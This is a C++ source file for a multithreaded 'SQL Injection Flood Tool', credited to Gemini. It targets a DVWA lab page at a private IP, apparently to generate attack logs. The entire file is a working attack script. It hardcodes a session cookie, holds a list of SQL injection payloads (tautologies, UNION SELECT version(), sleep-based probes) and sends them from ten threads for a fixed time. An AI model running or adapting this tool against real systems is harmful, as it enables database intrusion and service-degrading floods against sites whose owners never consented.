/*
 * DVWA SQL Injection Flood Tool (Multi-threaded & Timer)
 * Author: Gemini
 * Dependency: libcurl
 * Compile: g++ sqli_flood.cpp -o sqli_flood -lcurl -lpthread
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <curl/curl.h>

// === 配置区域 ===
// 目标 DVWA SQL 注入页面的 URL
const std::string TARGET_BASE_URL = "http://192.168.0.114/dvwa/vulnerabilities/sqli/";
// 您的 PHPSESSID (必须有效且已登录)
const std::string SESSION_ID = "vn1234567890abcdef123456"; 
const std::string SECURITY_LEVEL = "low";

// 配置并发线程数 (建议 4-10，太高可能会让靶机崩溃而非产生日志)
const int THREAD_COUNT = 10;
// 攻击持续时间 (秒)
const int ATTACK_DURATION = 60;

// === 全局控制变量 ===
std::atomic<bool> is_running(true); // 控制所有线程运行的开关
std::atomic<long> total_requests(0); // 统计发送的总请求数

// 注入 Payload 列表
const std::vector<std::string> PAYLOADS = {
    "' OR 1=1 #",
    "1' OR '1'='1",
    "' UNION SELECT null, version() #",
    "1' ORDER BY 1 #",
    "' AND sleep(1) #", // 稍微增加一点服务器负载
    "admin' #"
};

// libcurl 的回调函数 (丢弃接收到的数据，减少内存开销)
size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

// 线程工作函数
void attack_worker(int thread_id) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    std::string cookie_str = "security=" + SECURITY_LEVEL + "; PHPSESSID=" + SESSION_ID;
    
    // 设置共用的 HTTP 选项
    curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_str.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CPP-SQLi-Flooder/2.0");
    // 设置超时，防止请求卡死
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L); 

    CURLcode res;
    
    // 只要主开关是 true，就一直循环攻击
    while (is_running) {
        for (const auto& payload : PAYLOADS) {
            // 双重检查，确保时间到了立即退出，不需要跑完整个 Payload 列表
            if (!is_running) break;

            // URL 编码
            char *encoded_payload = curl_easy_escape(curl, payload.c_str(), payload.length());
            if (encoded_payload) {
                std::string full_url = TARGET_BASE_URL + "?id=" + std::string(encoded_payload) + "&Submit=Submit";
                
                curl_easy_setopt(curl, CURLOPT_URL, full_url.c_str());
                res = curl_easy_perform(curl);

                if (res == CURLE_OK) {
                    // 成功发送，计数器 +1
                    total_requests++;
                }
                curl_free(encoded_payload);
            }
        }
        // 可选：极短暂休眠防止把自己电脑跑死 (10ms)
        // std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    curl_easy_cleanup(curl);
    // 简单的线程结束提示 (不加锁，可能乱序，但为了性能不建议加锁)
    // std::cout << "Thread " << thread_id << " stopped." << std::endl;
}

int main() {
    // 全局初始化
    curl_global_init(CURL_GLOBAL_ALL);

    std::cout << "=== SQL Injection Flood Started ===" << std::endl;
    std::cout << "Target: " << TARGET_BASE_URL << std::endl;
    std::cout << "Threads: " << THREAD_COUNT << std::endl;
    std::cout << "Duration: " << ATTACK_DURATION << " seconds" << std::endl;
    std::cout << "Running..." << std::endl;

    // 1. 创建并启动线程
    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(attack_worker, i + 1);
    }

    // 2. 主线程充当计时器
    // 睡眠 60 秒，期间子线程在疯狂发送请求
    std::this_thread::sleep_for(std::chrono::seconds(ATTACK_DURATION));

    // 3. 时间到，通过原子变量通知子线程停止
    std::cout << "\n[!] Time is up! Stopping all threads..." << std::endl;
    is_running = false;

    // 4. 等待所有线程安全退出
    for (auto& t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }

    // 5. 输出统计
    std::cout << "=== Attack Finished ===" << std::endl;
    std::cout << "Total Requests Sent: " << total_requests.load() << std::endl;
    std::cout << "Avg Requests/Sec:    " << (total_requests.load() / ATTACK_DURATION) << std::endl;

    curl_global_cleanup();
    return 0;
}